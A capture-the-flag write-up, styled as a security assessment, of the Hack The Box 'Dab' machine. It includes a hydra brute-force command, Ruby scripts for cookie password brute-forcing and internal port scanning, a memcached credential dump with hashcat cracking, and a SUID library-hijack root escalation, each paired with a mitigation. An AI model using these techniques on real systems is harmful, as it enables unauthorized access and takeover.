---
layout: post
title: Hack The Box DAB Writeup Security Assessment
description: Hack the box 'DAB' writeup
fullview: true
---

# Introduction to the target.

Here we present a writeup of the "Dab" server and the applications it hosts. As we walk through each issue identified, we'll recommend a suitable mitigation against exploitation. A quick review of open services gives us a few targets.

## FTP
The ftp service accepts anonymous logons appears to have the single purpose of serving the organisation logo.

<amp-img alt="Dab logo"
    src="/assets/images/dab.jpg"
    height="680"
    width="733"
    layout="responsive"
    >
</amp-img>

### Recommendation
Although no significant issue is currently found here, in order to reduce attack surface, this service should be considered for removal.

## Web 

The web application service initially confronts a viewer with a username/password prompt. By testing several passwords, it can be identified that there is no account lockout or rate limiting in place, leading to an obvious potential for brute forcing. The following hydra script has been designed for the site in question:

```

hydra -l admin -P /usr/share/wordlists/rockyou.txt <address> http-post-form "/login:password=^PASS^&username=^USER^:failed"
```

It takes just a few minutes to identify a valid logon, and it should be stressed that the identified credentials meet strict password complexity policies. That is, it contained upper case, lower case, and numeric characters. Accordingly, such policies are not the solution to this type of problem.

## Developers console

The second service to review is the developer's console, on port 8080. This service utilises a more complex authentication system. The below custom code was built from reviewing browser interactions with the site, and will similarly brute force a valid credentials.

```
#!/usr/bin/env ruby
#
require 'httpclient'
require 'httpclient/webagent-cookie'

URL = URI.parse "http://SERVICE:8080/"

def win(password)
  puts "Won with #{password}"
  exit
end

File.open '/usr/share/wordlists/rockyou.txt' do |f|
  f.each_line do |password|
    cookie = WebAgent::Cookie.new
    cookie.name = "password"
    cookie.value = password.chomp
    cookie.url = URL

    client = HTTPClient.new
    client.cookie_manager.add cookie
    response = client.get URL

    puts "Failed password '#{password.chomp}'"
    win(password) unless response.body.match(/Access denied/)
  end
end
```

### Recommendations
Rather than review credentials systems, the developer console could consider alternate authentication mechanisms. These could include requiring VPN access, or IP based whitelisting in addition to the existing solution.

## Utilising the developer console
The developer console can be utilised to connect to an arbitrary local port. The following script has been developed to enumerate all local services by abusing this functionality of the developer's console. This identifies access to several ports not accessible from the outside world.

```
#!/usr/bin/env ruby
#
require 'httpclient'
require 'httpclient/webagent-cookie'

URL = URI.parse "http://SERVER:8080/"

def win(port)
  puts "Won with #{port}"
end

cookie = WebAgent::Cookie.new
cookie.name = "password"
cookie.value = VALUE
cookie.url = URL

1.upto TOP do |port|

  client = HTTPClient.new
  client.cookie_manager.add cookie
  response = client.get URI.parse "http://SERVER:8080/socket?port=#{port}&cmd=test"

  puts "Failed port '#{port}'"
  win(port) unless response.body.match(/500 Internal/)
end

```

The capability is not seen as a vulnerability in the developer's console, but rather as an indication the console itself requires better access control.

## Extracting a password list

The developer's console identifies a memcached service running, and accepting raw string data from that console. The following URL can be utilised to dump available cache information:

http://SERVER:8080/socket?port=11211&cmd=stats+items

[Further information regarding the memcache protocol can be reviewed here.](https://wincent.com/wiki/Testing_memcached_with_telnet)

With this background, the below script can be utilised to dump cached passwords. It is required to manually attempt to logon to the console shortly before running this script.

```
#!/usr/bin/env ruby
#
require 'json'
list = File.read "userlist.json"

listj = JSON.parse(list)

listj.each_pair do |user, password|
  puts "#{user}:#{password}"
end
```

This should dump 495 username/hashed password combinations.

    hashcat64 --show dab.txt rockyou -m 0 --username

Allows for a relatively quick brute force attack on the dumped data, supplying 12 valid user credentials. Once of these is a valid SSH user.

## Privilege Escalation
Enough enumerating various paths will lead you to a SUID root binary named 'myexc'. Running it looks like this:

```
myexec
Enter password:
```

Attempting to copy the binary offsite to debug will inform you a library is required, which we can easily find:

```
$ find /usr -name libseclogin*
/usr/lib/libseclogin.so
/usr/src/libseclogin
genevieve@dab:~$ ls /usr/src/libseclogin/
seclogin.h
genevieve@dab:~$ cat /usr/src/libseclogin/seclogin.h
#include<stdio.h>
extern unsigned int seclogin();
```

ltrace happily tells us the password required to proceed.

```
 ltrace myexec
__libc_start_main(0x400836, 1, 0x7fff4a651bc8, 0x4008f0 <unfinished ...>
printf("Enter password: ")                      = 16
__isoc99_scanf(0x400985, 0x7fff4a651a90, 0x7f491a4c5780, 16Enter password: atest
) = 1
strcmp("s3cur3l0g1n", "atest")                  = 18
puts("Invalid password\n"Invalid password

)                      = 18
+++ exited (status 1) +++

```

Let's use that and see what the binary has in store for us. Note, saw above what seclogin() looks like and how exactly it responds.

```

genevieve@dab:~$ myexec
Enter password: s3cur3l0g1n
Password is correct

seclogin() called
TODO: Placeholder for now, function not implemented yet

```

The attacker really should be blocked at this point. Utilising an external library isn't a vulnerability on a SUID binary, since the usual LD\_PRELOAD tricks are ignored by the OS. In fact, the only place a preloaded library is accepted from is the locations defined under /etc/ld/so.conf.d. What do we see here however?

```
 cat /etc/ld.so.conf.d/test.conf
/tmp
```

At this point, we have a valid preload path, and a function we know how to call. Let's build and run a shell:

```
mine.c: In function ‘seclogin’:
mine.c:9:1: warning: control reaches end of non-void function [-Wreturn-type]
 }
 ^
genevieve@dab:~$ myexec
Enter password: s3cur3l0g1n
Password is correct

$ whoami
genevieve
$ id
uid=1000(genevieve) gid=0(root) groups=0(root),1000(genevieve)
```

And with root access, the attacker has full control of the machine. Our recommendation in response is to move development projects off the production servers.
